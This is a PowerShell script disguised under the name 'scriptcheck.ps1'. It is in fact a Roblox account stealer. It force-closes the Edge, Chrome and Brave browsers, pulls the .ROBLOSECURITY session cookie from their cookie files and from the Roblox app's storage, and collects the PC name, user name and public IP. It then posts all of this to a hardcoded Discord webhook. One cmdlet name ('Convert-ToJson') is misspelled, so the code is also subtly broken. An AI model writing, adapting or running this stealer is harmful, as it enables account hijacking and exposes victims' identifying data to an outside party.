# scriptcheck.ps1 - Optimized
$w = 'https://discord.com/api/webhooks/1537750275459121254/tii30i26ayBfg5HooY0xU6QRJflrTzeppVmbIBwz7FCZre3hV4j8TleoytkJsUoX4PLY'

# Kill browsers to unlock cookie files
Get-Process -Name msedge, chrome, brave -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# Function to extract cookie
function Get-RobloxCookie {
    param($path)
    if (Test-Path $path) {
        $tmp = "$env:TEMP\cook.txt"
        Copy-Item $path $tmp -ErrorAction SilentlyContinue
        if (Test-Path $tmp) {
            $c = Get-Content $tmp -ErrorAction SilentlyContinue
            if ($c -match '\.ROBLOSECURITY=([^;]+)') {
                return $matches[1]
            }
            Remove-Item $tmp -ErrorAction SilentlyContinue
        }
    }
    return ''
}

# Check all browsers
$rb = Get-RobloxCookie "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
if ($rb -eq '') { $rb = Get-RobloxCookie "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" }
if ($rb -eq '') { $rb = Get-RobloxCookie "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies" }

# Check Roblox app
if ($rb -eq '') {
    $paths = @("$env:APPDATA\Roblox\Local Storage\leveldb\*.log", "$env:APPDATA\Roblox\Local Storage\leveldb\*.ldb")
    foreach ($p in $paths) {
        if (Test-Path $p) {
            $c = Get-Content $p -ErrorAction SilentlyContinue
            if ($c -match '\.ROBLOSECURITY=([^;]+)') {
                $rb = $matches[1]
                break
            }
        }
    }
}

# Send to Discord
$ip = (Invoke-WebRequest -Uri 'http://api.ipify.org' -UseBasicParsing).Content
$sys = "PC: $env:COMPUTERNAME`nUser: $env:USERNAME`nIP: $ip"
$msg = "✅ **ScriptCheck Result**`n$sys`n`n🎮 **Roblox Cookie:**`n```$rb```"
$body = @{ content = $msg } | Convert-ToJson
Invoke-RestMethod -Uri $w -Method Post -Body $body -ContentType 'application/json'
